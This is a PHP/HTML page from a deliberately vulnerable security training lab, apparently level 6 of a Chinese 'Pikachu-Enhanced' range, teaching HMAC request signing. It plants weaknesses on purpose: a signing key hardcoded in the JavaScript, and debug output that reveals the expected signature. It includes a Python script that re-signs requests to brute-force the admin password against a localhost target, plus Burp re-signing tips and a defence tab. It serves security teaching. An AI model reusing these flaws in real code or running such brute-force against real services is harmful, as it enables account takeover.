<?php
/**
 * Pikachu-Enhanced v2.0 - 前端加解密对抗: Level 6 - 明文数据加签防篡改
 */
$PIKA_ROOT_DIR = "../../";
require_once __DIR__ . '/encrypt_helper.inc.php';

// 处理 POST 验签请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $rawInput = file_get_contents("php://input");
    $data = json_decode($rawInput, true);

    if (!$data) {
        $data = $_POST;
    }

    if (isset($data['username'], $data['password'], $data['nonce'], $data['timestamp'], $data['signature'])) {
        $username = $data['username'];
        $password = $data['password'];
        $nonce    = $data['nonce'];
        $timestamp = intval($data['timestamp']);
        $clientSig = $data['signature'];

        // 1. 校验请求时间戳新鲜度 (5 分钟有效期)
        $now = time();
        if (abs($now - $timestamp) > 300) {
            echo json_encode(['success' => false, 'error' => '请求时间戳超出有效范围 (Timestamp timeout / expired)'], JSON_UNESCAPED_UNICODE);
            exit;
        }

        // 2. 服务端依据相同规则与预共享密钥重新计算 HMAC-SHA256 签名
        $dataToSign = $username . $password . $nonce . $timestamp;
        $serverSig = hash_hmac('sha256', $dataToSign, ENCRYPT_SIGN_SECRET_KEY);

        // 3. 安全常量时间比对验签
        if (!hash_equals($serverSig, $clientSig)) {
            echo json_encode([
                'success' => false,
                'error' => '❌ 签名校验失败！检测到数据包被篡改或 SecretKey 不匹配 (Signature mismatch - Data tampered)',
                'debug' => [
                    'expected_sig' => $serverSig,
                    'received_sig' => $clientSig,
                    'payload_signed' => $dataToSign
                ]
            ], JSON_UNESCAPED_UNICODE);
            exit;
        }

        // 4. 签名校验通过，继续执行业务数据库认证
        $authRes = pika_encrypt_verify_user($username, $password);
        if ($authRes['success']) {
            echo json_encode([
                'success' => true,
                'message' => '🎉 验签通过，身份认证成功！(Signature & Auth Passed)',
                'username' => $authRes['username'],
                'debug' => [
                    'server_verified_sig' => $serverSig,
                    'nonce' => $nonce,
                    'timestamp' => $timestamp
                ]
            ], JSON_UNESCAPED_UNICODE);
        } else {
            echo json_encode([
                'success' => false,
                'error' => $authRes['error'],
                'debug' => ['signature_status' => 'VALID']
            ], JSON_UNESCAPED_UNICODE);
        }
        exit;
    } else {
        echo json_encode(['success' => false, 'error' => '缺少必需参数 (username, password, nonce, timestamp, signature)'], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

$SELF_PAGE = substr($_SERVER['PHP_SELF'], strrpos($_SERVER['PHP_SELF'], '/') + 1);
if ($SELF_PAGE == "signdata.php") {
    $ACTIVE = array_fill(0, 360, '');
    $ACTIVE[340] = 'active open';
    $ACTIVE[347] = 'active';
}

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.crypto-card {
    background: var(--bg-card, #ffffff);
    border: 1px solid var(--border-subtle, #e2e8f0);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.04);
}
.inspector-panel {
    background: #0f172a;
    color: #e2e8f0;
    border-radius: 10px;
    padding: 16px;
    font-family: monospace;
    font-size: 13px;
    line-height: 1.6;
    overflow-x: auto;
}
.inspector-title {
    color: #94a3b8;
    font-size: 12px;
    text-transform: uppercase;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    gap: 6px;
}
.nav-tabs-custom {
    border-bottom: 2px solid #e2e8f0;
    margin-bottom: 20px;
    display: flex;
    gap: 8px;
}
.nav-tabs-custom button {
    background: none;
    border: none;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #64748b;
    border-bottom: 2px solid transparent;
    cursor: pointer;
    transition: all 0.2s;
}
.nav-tabs-custom button.active {
    color: #059669;
    border-bottom-color: #059669;
}
.tab-pane-custom {
    display: none;
}
.tab-pane-custom.active {
    display: block;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="<?php echo $PIKA_ROOT_DIR;?>index.php">首页</a></li>
                <li><a href="<?php echo $PIKA_ROOT_DIR;?>vul/encrypt/encrypt.php">前端加解密对抗</a></li>
                <li class="active">Level 6 - 明文加签防篡改</li>
            </ul>
        </div>

        <div class="page-content">
            <!-- 场景标题与说明 -->
            <div style="margin-bottom: 24px;">
                <div style="display:flex; align-items:center; gap:10px; margin-bottom:8px;">
                    <span class="badge" style="background:#059669; font-size:12px; padding:4px 10px;">Level 6</span>
                    <span class="badge" style="background:#0f766e; font-size:12px; padding:4px 10px;">HMAC-SHA256</span>
                    <span class="badge" style="background:#b45309; font-size:12px; padding:4px 10px;">Anti-Tamper Signature</span>
                </div>
                <h2 style="font-weight: 800; font-size: 24px; margin: 0 0 8px 0; color: #0f172a;">
                    明文数据加签防篡改验证 (HMAC-SHA256 Payload Signature)
                </h2>
                <p style="font-size: 14px; color: #64748b; margin: 0; line-height: 1.6;">
                    与前几关将数据整体加密不同，许多现代 RESTful API 采用“明文传输 + 哈希加签防篡改”的设计。业务数据在网络中完全清晰可读，但请求尾部附带基于客户端 SecretKey 计算的 <code>signature</code>。若攻击者在 Burp Suite 中篡改了任何参数而未重新计算签名，服务端将立即拒绝处理！
                </p>
            </div>

            <div class="row">
                <!-- 左侧: 交互式登录挑战卡片 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <h4 style="margin:0 0 16px 0; font-weight:700; font-size:16px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-fingerprint" style="color:#059669;"></i> 数据加签防篡改挑战
                        </h4>

                        <div id="loginAlert" style="display:none; margin-bottom:16px;"></div>

                        <form id="cryptoLoginForm" onsubmit="handleSignSubmit(event)">
                            <div class="form-group" style="margin-bottom:14px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">账号 (Username):</label>
                                <input type="text" id="username" class="form-control" value="admin" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>
                            <div class="form-group" style="margin-bottom:16px;">
                                <label style="font-weight:600; font-size:13px; color:#334155; margin-bottom:6px; display:block;">密码 (Password):</label>
                                <input type="password" id="password" class="form-control" value="123456" required style="border-radius:8px; padding:10px 12px; height:auto;">
                            </div>

                            <!-- 模拟中间人篡改开关 -->
                            <div class="form-group" style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:8px; padding:12px; margin-bottom:18px;">
                                <label style="display:flex; align-items:center; gap:8px; margin:0; cursor:pointer; font-weight:600; font-size:13.5px; color:#b91c1c;">
                                    <input type="checkbox" id="tamperCheck" style="width:16px; height:16px;">
                                    <span>⚠️ 模拟中间人篡改数据 (Simulate MITM Tampering)</span>
                                </label>
                                <p style="margin:4px 0 0 24px; font-size:12px; color:#64748b;">
                                    勾选后，脚本在计算完签名后将强制篡改密码为 <code>hacked123</code> 但保持旧签名不变，直观观察服务端的验签阻断表现！
                                </p>
                            </div>

                            <button type="submit" id="submitBtn" class="btn btn-primary btn-block" style="border-radius:8px; font-weight:700; padding:11px; background:#059669; border-color:#059669;">
                                <i class="ph-bold ph-shield-check"></i> 计算 HMAC 签名并发送请求
                            </button>
                        </form>
                    </div>

                    <!-- 实时数据流监视器 -->
                    <div class="crypto-card" style="padding: 20px;">
                        <h4 style="margin:0 0 14px 0; font-weight:700; font-size:15px; display:flex; align-items:center; gap:8px;">
                            <i class="ph-bold ph-broadcast" style="color:#0ea5e9;"></i> 签名流水线实时数据流
                        </h4>
                        
                        <div class="inspector-title"><i class="ph-bold ph-key"></i> 1. 签名要素与密钥</div>
                        <div class="inspector-panel" id="inspSignElements" style="margin-bottom:12px;">SecretKey: be56e057f20f883e | Algo: HMAC-SHA256</div>

                        <div class="inspector-title"><i class="ph-bold ph-file-text"></i> 2. 待签原始拼接串 (dataToSign)</div>
                        <div class="inspector-panel" id="inspDataToSign" style="margin-bottom:12px;">// username + password + nonce + timestamp</div>

                        <div class="inspector-title"><i class="ph-bold ph-globe"></i> 3. 最终抓包 JSON (含 signature)</div>
                        <div class="inspector-panel" id="inspCipher" style="margin-bottom:12px;">// 等待发送...</div>

                        <div class="inspector-title"><i class="ph-bold ph-cpu"></i> 4. 服务端验签与数据库认证响应</div>
                        <div class="inspector-panel" id="inspResponse">// 等待服务端响应...</div>
                    </div>
                </div>

                <!-- 右侧: 渗透与对抗指引 -->
                <div class="col-md-6">
                    <div class="crypto-card">
                        <div class="nav-tabs-custom">
                            <button class="active" onclick="switchTab(event, 'tab1')"><i class="ph-bold ph-magnifying-glass"></i> 签名逆向分析</button>
                            <button onclick="switchTab(event, 'tab2')"><i class="ph-bold ph-wrench"></i> Burp 插件重签</button>
                            <button onclick="switchTab(event, 'tab3')"><i class="ph-bold ph-terminal"></i> Python 自动加签</button>
                            <button onclick="switchTab(event, 'tab4')"><i class="ph-bold ph-shield-check"></i> 安全防御机制</button>
                        </div>

                        <!-- Tab 1: 签名逆向分析 -->
                        <div id="tab1" class="tab-pane-custom active">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🔍 前端硬编码签名的脆弱性</h5>
                            <ol style="font-size:13.5px; color:#475569; line-height:1.8; padding-left:20px;">
                                <li><strong>拼接顺序易被逆向：</strong>前端 JS 代码完全对客户端可见，搜索 <code>HmacSHA256</code> 即可快速发现拼接顺序为：
                                    <pre style="margin-top:6px; background:#f1f5f9; padding:8px; border-radius:6px; font-size:12px;">const dataToSign = username + password + nonce + timestamp;</pre>
                                </li>
                                <li><strong>硬编码 SecretKey 泄露：</strong>签名之所以有效，完全建立在“只有合法通信方掌握密钥”的假设上。如果 SecretKey 直接硬编码在 JS 中（如 <code>be56e057f20f883e</code>），攻击者在篡改数据包后完全可以使用该密钥<strong>自行重新计算合法的签名</strong>，签名防护彻底失效！</li>
                            </ol>
                        </div>

                        <!-- Tab 2: Burp 插件重签 -->
                        <div id="tab2" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛠️ Burp Suite 自动化签名重算对抗</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.6;">
                                在 Repeater 或 Intruder 中修改任何参数后，必须由插件拦截并在发包前自动更新 <code>signature</code> 与 <code>timestamp</code>：
                            </p>
                            <ul style="font-size:13px; color:#334155; line-height:1.7;">
                                <li><strong>AutoDecoder 签名模块：</strong>设置签名规则为 HMAC-SHA256，指定 SecretKey 为 <code>be56e057f20f883e</code>。</li>
                                <li><strong>BurpCrypto 或自定义 Python 插件：</strong>注册 <code>IHttpListener</code>，解析出新的 username/password，生成当前时间戳，计算 HMAC 后替换请求体中的 <code>signature</code>。</li>
                            </ul>
                        </div>

                        <!-- Tab 3: Python 自动加签 -->
                        <div id="tab3" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🐍 Python 字典自动化加签爆破脚本</h5>
                            <pre style="background:#0f172a; color:#f8fafc; border-radius:8px; padding:14px; font-size:12px; line-height:1.5; max-height:360px; overflow-y:auto;"><code>import time
import hmac
import random
import string
import hashlib
import requests

TARGET_URL = "http://127.0.0.1:8765/vul/encrypt/signdata.php"
SECRET_KEY = b"be56e057f20f883e"

def build_signed_packet(username, password):
    nonce = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    timestamp = int(time.time())
    data_to_sign = f"{username}{password}{nonce}{timestamp}"
    signature = hmac.new(SECRET_KEY, data_to_sign.encode('utf-8'), hashlib.sha256).hexdigest()

    return {
        "username": username,
        "password": password,
        "nonce": nonce,
        "timestamp": timestamp,
        "signature": signature
    }

# 爆破测试
passwords = ["123", "admin888", "123456", "password"]
for pwd in passwords:
    payload = build_signed_packet("admin", pwd)
    res = requests.post(TARGET_URL, json=payload)
    data = res.json()
    if data.get("success"):
        print(f"[+] 认证成功: admin / {pwd}")
        break
    else:
        print(f"[-] 密码 [{pwd}] 失败: {data.get('error')}")
</code></pre>
                        </div>

                        <!-- Tab 4: 安全防御机制 -->
                        <div id="tab4" class="tab-pane-custom">
                            <h5 style="font-weight:700; color:#1e293b; margin-top:0;">🛡️ 真正的企业级数据防篡改规范</h5>
                            <p style="font-size:13.5px; color:#475569; line-height:1.7;">
                                1. <strong>禁止前端明文硬编码签名私钥：</strong>浏览器是完全开放的不可信客户端，任何存在于 JS、WASM 中的密钥均可被逆向抽取。<br>
                                2. <strong>设备级安全存储 (TEE / Keychain):</strong> 若为移动端 APP，可借助安全硬件与代码加固保护签名秘钥；对于普通 Web，防篡改与完整性应由 TLS 传输层保证。<br>
                                3. <strong>服务端防重放数据库联动：</strong>在校验时间戳的同时，务必将 <code>nonce</code> 或 <code>signature</code> 写入分布式缓存（如 Redis），校验其在时间窗口内的唯一性。
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="<?php echo $PIKA_ROOT_DIR;?>assets/js/crypto-js.min.js"></script>

<script>
const SECRET_KEY = "be56e057f20f883e";

function switchTab(evt, tabId) {
    document.querySelectorAll('.nav-tabs-custom button').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-pane-custom').forEach(p => p.classList.remove('active'));
    evt.currentTarget.classList.add('active');
    document.getElementById(tabId).classList.add('active');
}

function handleSignSubmit(e) {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const isTampered = document.getElementById('tamperCheck').checked;
    const alertBox = document.getElementById('loginAlert');
    const submitBtn = document.getElementById('submitBtn');

    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="ph-bold ph-spinner ph-spin"></i> 正在加签计算...';

    // 1. 生成 Nonce 与 Timestamp
    const nonce = Math.random().toString(36).substring(2, 10);
    const timestamp = Math.floor(Date.now() / 1000);

    // 2. 按照约定拼接待签字符串
    const dataToSign = username + password + nonce + timestamp;
    document.getElementById('inspDataToSign').textContent = dataToSign;

    // 3. 计算 HMAC-SHA256 签名
    const signature = CryptoJS.HmacSHA256(dataToSign, SECRET_KEY).toString(CryptoJS.enc.Hex);

    // 4. 构建数据包（若开启篡改模拟，则在此故意修改参数）
    let wirePassword = password;
    if (isTampered) {
        wirePassword = "hacked_password_123";
    }

    const wirePayload = {
        username: username,
        password: wirePassword,
        nonce: nonce,
        timestamp: timestamp,
        signature: signature
    };

    document.getElementById('inspCipher').textContent = JSON.stringify(wirePayload, null, 2);

    // 5. 提交请求
    fetch('signdata.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json; charset=utf-8'
        },
        body: JSON.stringify(wirePayload)
    })
    .then(r => r.json())
    .then(data => {
        document.getElementById('inspResponse').textContent = JSON.stringify(data, null, 2);
        alertBox.style.display = 'block';
        if (data.success) {
            alertBox.className = 'alert alert-success';
            alertBox.innerHTML = '<i class="ph-bold ph-check-circle"></i> <strong>' + data.message + '</strong> [' + data.username + '] 验证通过！';
        } else {
            alertBox.className = 'alert alert-danger';
            alertBox.innerHTML = '<i class="ph-bold ph-x-circle"></i> <strong>校验失败:</strong> ' + (data.error || '签名错误');
        }
    })
    .catch(err => {
        document.getElementById('inspResponse').textContent = 'Request Error: ' + err.message;
        alertBox.style.display = 'block';
        alertBox.className = 'alert alert-danger';
        alertBox.innerHTML = '<i class="ph-bold ph-warning"></i> 请求发生异常: ' + err.message;
    })
    .finally(() => {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="ph-bold ph-shield-check"></i> 计算 HMAC 签名并发送请求';
    });
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
